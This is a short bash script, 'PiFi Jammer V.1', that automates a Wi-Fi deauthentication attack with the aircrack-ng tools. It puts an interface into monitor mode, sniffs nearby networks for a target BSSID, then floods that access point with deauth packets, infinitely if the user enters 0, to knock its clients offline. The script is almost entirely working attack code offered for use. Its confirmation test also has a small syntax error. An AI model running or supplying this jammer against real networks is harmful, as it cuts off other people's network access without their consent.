#!/bin/bash

#Documentation
echo "----------------------------------------"
echo "-----------PiFi Jammer V.1--------------"
echo "----------------------------------------"
echo "--                                    --"
echo "--   Written by Christopher Muench    --"
echo "--       muenchc@sunypoly.edu         --"
echo "--                                    --"
echo "----------------------------------------"
echo "--                                    --"
echo "--Used to Jam a given wireless network--"
echo "--***Further documentation goes here**--"
echo "--                                    --"
echo "----------------------------------------"
echo "----------------------------------------"
echo "------Listing wireless interfaces-------"
echo "----------------------------------------"

#display wireless interfaces and get selection
INTERFACE=""
iwconfig
read -p "Enter the interface you would like to monitor:" INTERFACE
echo "You chose: $INTERFACE"

#start monitor mode on chosen interface and kill processes that may interfere with aircrack
echo "Starting monitor mode on $INTERFACE..."
sudo airmon-ng check kill
sudo airmon-ng start $INTERFACE

#inform user of what they will be looking at
echo "**Once The wireless network to attack has been selected,**"
echo "**Please write down the BSSID of the network you wish to jam.**"
echo "**You will need the BSSID for the next stage of the attack.**"

#run airodump on selected monitor interface
MONIFACE=""
iwconfig
read -p "Please enter the name of the monitor Interface to read from (should end in mon): " MONIFACE
echo "You chose: $MONIFACE"
echo "**Please press ctrl+c to stop sniffing networks once the BSSID has been noted**"
sudo airodump-ng $MONIFACE

#get BSSID (AP MAC Address) from user
BSSID=""
read -p "Please enter the BSSID of the network you wish to jam (Needs to be entered exactly as displayed):" BSSID

#determine number of deauth packets to send
PACKETS=0
read -p "Please enter the number of deauth packets to send (0 sends an infinite number):" PACKETS
echo "You have chosen to send $PACKETS packets."

#ensure the user is ready to send the attack
CONFIRM=""
read -p "Are you sure you want to jam this network (***USE AT YOUR OWN RISK***)? y/n" CONFIRM

#enter logic to either start the attack or quit
if [ "$CONFIRM" == "y" -o "$CONFIRM" == "Y"]
then
    #launch the attack
    echo "Lauching Deauthentication Attack..."
    echo "***Press ctrl+c to abort attack***"
    aireplay-ng -0 $PACKETS -a $BSSID $MONIFACE
    exit
else
    echo "Aborting Deauthentication Attack..."
    exit
fi